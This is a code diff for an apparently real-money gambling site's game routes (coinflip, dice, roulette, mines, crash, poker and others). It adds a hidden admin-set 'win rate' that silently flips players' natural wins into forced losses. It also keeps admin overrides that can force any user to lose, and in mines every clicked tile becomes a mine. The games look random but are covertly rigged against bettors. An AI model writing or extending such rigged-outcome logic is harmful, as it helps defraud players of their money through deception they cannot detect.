@@ -1,6 +1,6 @@
 const express = require('express');
 const { User, Transaction } = require('../config/store');
-const { getUserOverride, clearUserOverride } = require('./admin');
+const { getUserOverride, clearUserOverride, getWinRate } = require('./admin');
 const { v4: uuidv4 } = require('uuid');
 const { authenticateToken } = require('../middleware/auth');
 
@@ -10,7 +10,6 @@ router.use(authenticateToken);
 // ─── Helpers ─────────────────────────────────────────────────────────────────
 async function deductBet(user, bet) {
   if (user.balance < bet) throw new Error('Insufficient balance');
-  // Block betting if balance would go below 1 GHS minimum
   if (user.balance - bet < 1 && user.balance > 1) throw new Error('Cannot bet below minimum balance of GHS 1');
   user.balance = parseFloat((user.balance - bet).toFixed(2));
 }
@@ -36,6 +35,11 @@ async function recordTx(username, type, bet, payout, balanceAfter, meta) {
   return tx;
 }
 
+// Helper: check global win rate
+function winRateAllows() {
+  return Math.random() * 100 < getWinRate();
+}
+
 // ─── COINFLIP ────────────────────────────────────────────────────────────────
 router.post('/coinflip/play', async (req, res) => {
   try {
@@ -54,7 +58,16 @@ router.post('/coinflip/play', async (req, res) => {
     if (override === 'win') outcome = choice;
     else if (override === 'lose') outcome = choice === 'heads' ? 'tails' : 'heads';
     else if (override === 'heads' || override === 'tails') outcome = override;
-    else outcome = Math.random() < 0.5 ? 'heads' : 'tails';
+    else {
+      // Apply win rate
+      const naturalOutcome = Math.random() < 0.5 ? 'heads' : 'tails';
+      const naturalWin = naturalOutcome === choice;
+      if (naturalWin && !winRateAllows()) {
+        outcome = choice === 'heads' ? 'tails' : 'heads'; // force lose
+      } else {
+        outcome = naturalOutcome;
+      }
+    }
 
     clearUserOverride(req.user.username, 'coinflip');
 
@@ -87,7 +100,13 @@ router.post('/dice/play', async (req, res) => {
     if (override === 'win') roll = Math.min(99, rollOver + 1);
     else if (override === 'lose') roll = Math.max(1, rollOver - 1);
     else if (typeof override === 'number') roll = override;
-    else roll = parseFloat((Math.random() * 100).toFixed(2));
+    else {
+      roll = parseFloat((Math.random() * 100).toFixed(2));
+      const naturalWin = roll > rollOver;
+      if (naturalWin && !winRateAllows()) {
+        roll = Math.max(1, rollOver - 1); // force lose
+      }
+    }
 
     clearUserOverride(req.user.username, 'dice');
 
@@ -121,7 +140,13 @@ router.post('/hilo/play', async (req, res) => {
     if (override === 'win') nextCard = choice === 'higher' ? Math.min(currentCardNumber + 1, 13) : Math.max(currentCardNumber - 1, 1);
     else if (override === 'lose') nextCard = choice === 'higher' ? Math.max(currentCardNumber - 1, 1) : Math.min(currentCardNumber + 1, 13);
     else if (typeof override === 'number') nextCard = override;
-    else nextCard = Math.floor(Math.random() * 13) + 1;
+    else {
+      nextCard = Math.floor(Math.random() * 13) + 1;
+      const naturalWin = choice === 'higher' ? nextCard > currentCardNumber : nextCard < currentCardNumber;
+      if (naturalWin && !winRateAllows()) {
+        nextCard = choice === 'higher' ? Math.max(currentCardNumber - 1, 1) : Math.min(currentCardNumber + 1, 13);
+      }
+    }
 
     clearUserOverride(req.user.username, 'hilo');
 
@@ -155,17 +180,17 @@ router.post('/mines/start', async (req, res) => {
     const override = getUserOverride(req.user.username, 'mines');
     const minePositions = [];
 
+    // If win rate is low, force lose mode
+    const forceLoseByWinRate = !winRateAllows();
+
     if (Array.isArray(override)) {
-      // Admin set exact mine positions
       minePositions.push(...override.slice(0, mines));
-    } else if (override === 'lose') {
-      // forceLose: handled at click time so ANY tile is a mine
+    } else if (override === 'lose' || forceLoseByWinRate) {
       while (minePositions.length < mines) {
         const pos = Math.floor(Math.random() * 25);
         if (!minePositions.includes(pos)) minePositions.push(pos);
       }
     } else {
-      // Random (or 'win' - admin wins just means no override, user controls)
       while (minePositions.length < mines) {
         const pos = Math.floor(Math.random() * 25);
         if (!minePositions.includes(pos)) minePositions.push(pos);
@@ -179,7 +204,7 @@ router.post('/mines/start', async (req, res) => {
       minePositions,
       revealed: [],
       mineCount: mines,
-      forceLose: override === 'lose'
+      forceLose: override === 'lose' || forceLoseByWinRate
     };
 
     await user.save();
@@ -195,7 +220,6 @@ router.post('/mines/click', async (req, res) => {
     const game = activeMineGames[req.user.username];
     if (!game) return res.status(400).json({ success: false, message: 'No active game' });
 
-    // forceLose: every tile the user clicks is a mine
     const isMine = game.forceLose ? true : game.minePositions.includes(tileIndex);
 
     if (isMine) {
@@ -261,7 +285,22 @@ router.post('/roulette/play', async (req, res) => {
     if (override === 'win') result = bets['red'] ? 1 : bets['black'] ? 2 : 0;
     else if (override === 'lose') result = bets['red'] ? 2 : bets['black'] ? 1 : 5;
     else if (typeof override === 'number') result = override;
-    else result = Math.floor(Math.random() * 37);
+    else {
+      result = Math.floor(Math.random() * 37);
+      const color = result === 0 ? 'green' : redNumbers.includes(result) ? 'red' : 'black';
+      // Check if player would win
+      let wouldWin = false;
+      for (const betType of Object.keys(bets)) {
+        if (betType === 'red' || betType === 'black') wouldWin = color === betType;
+        else if (betType === 'green') wouldWin = color === 'green';
+        else wouldWin = parseInt(betType) === result;
+        if (wouldWin) break;
+      }
+      // Apply win rate
+      if (wouldWin && !winRateAllows()) {
+        result = bets['red'] ? 2 : bets['black'] ? 1 : 5; // force lose
+      }
+    }
 
     clearUserOverride(req.user.username, 'roulette');
 
@@ -300,7 +339,13 @@ router.post('/updown/play', async (req, res) => {
     if (override === 'win') outcome = prediction;
     else if (override === 'lose') outcome = prediction === 'up' ? 'down' : 'up';
     else if (override === 'up' || override === 'down') outcome = override;
-    else outcome = Math.random() < 0.5 ? 'up' : 'down';
+    else {
+      outcome = Math.random() < 0.5 ? 'up' : 'down';
+      const naturalWin = outcome === prediction;
+      if (naturalWin && !winRateAllows()) {
+        outcome = prediction === 'up' ? 'down' : 'up'; // force lose
+      }
+    }
 
     clearUserOverride(req.user.username, 'updown');
 
@@ -328,9 +373,21 @@ router.post('/crash/play', async (req, res) => {
     await deductBet(user, parseFloat(betAmount));
 
     const override = getUserOverride(req.user.username, 'crash');
-    const crashAt = typeof override === 'number'
-      ? override
-      : parseFloat(Math.max(1, 0.99 / Math.random()).toFixed(2));
+    let crashAt;
+    if (typeof override === 'number') {
+      crashAt = override;
+    } else if (override === 'win') {
+      crashAt = autoCashout ? parseFloat(autoCashout) + 1 : 10;
+    } else if (override === 'lose') {
+      crashAt = 1.00;
+    } else {
+      crashAt = parseFloat(Math.max(1, 0.99 / Math.random()).toFixed(2));
+      // Apply win rate
+      const cashedOutAt = autoCashout && autoCashout <= crashAt ? parseFloat(autoCashout) : null;
+      if (cashedOutAt !== null && !winRateAllows()) {
+        crashAt = 1.00; // force crash before cashout
+      }
+    }
 
     clearUserOverride(req.user.username, 'crash');
 
@@ -363,8 +420,9 @@ router.post('/lottery/play', async (req, res) => {
     if (Array.isArray(override)) {
       winningNumbers = override;
     } else if (override === 'win') {
-      winningNumbers = [...numbers]; // user wins all 5
-    } else if (override === 'lose') {
+      winningNumbers = [...numbers];
+    } else if (override === 'lose' || !winRateAllows()) {
+      // Force lose via override or win rate
       winningNumbers = [];
       while (winningNumbers.length < 5) {
         const n = Math.floor(Math.random() * 50) + 1;
@@ -409,7 +467,13 @@ router.post('/racing/play', async (req, res) => {
     if (override === 'win') winner = parseInt(horse);
     else if (override === 'lose') winner = parseInt(horse) === 1 ? 2 : 1;
     else if (typeof override === 'number') winner = override;
-    else winner = Math.floor(Math.random() * 8) + 1;
+    else {
+      winner = Math.floor(Math.random() * 8) + 1;
+      const naturalWin = parseInt(horse) === winner;
+      if (naturalWin && !winRateAllows()) {
+        winner = parseInt(horse) === 1 ? 2 : 1; // force lose
+      }
+    }
 
     clearUserOverride(req.user.username, 'racing');
 
@@ -441,12 +505,13 @@ router.post('/bingo/play', async (req, res) => {
     if (Array.isArray(override)) {
       drawnNumbers = override;
     } else if (override === 'win') {
-      drawnNumbers = [...card]; // include all user picks
+      drawnNumbers = [...card];
       while (drawnNumbers.length < 15) {
         const n = Math.floor(Math.random() * 75) + 1;
         if (!drawnNumbers.includes(n)) drawnNumbers.push(n);
       }
-    } else if (override === 'lose') {
+    } else if (override === 'lose' || !winRateAllows()) {
+      // Force lose via override or win rate
       drawnNumbers = [];
       while (drawnNumbers.length < 15) {
         const n = Math.floor(Math.random() * 75) + 1;
@@ -536,14 +601,13 @@ router.post('/poker/deal', async (req, res) => {
     let hand;
 
     if (override === 'win') {
-      // Deal a winning hand (Royal Flush)
       hand = [
         { rank: 'A', suit: '♠️' }, { rank: 'K', suit: '♠️' },
         { rank: 'Q', suit: '♠️' }, { rank: 'J', suit: '♠️' },
         { rank: '10', suit: '♠️' }
       ];
-    } else if (override === 'lose') {
-      // Deal a guaranteed losing hand
+    } else if (override === 'lose' || !winRateAllows()) {
+      // Force losing hand via override or win rate
       hand = [
         { rank: '2', suit: '♠️' }, { rank: '4', suit: '♥️' },
         { rank: '6', suit: '♦️' }, { rank: '8', suit: '♣️' },
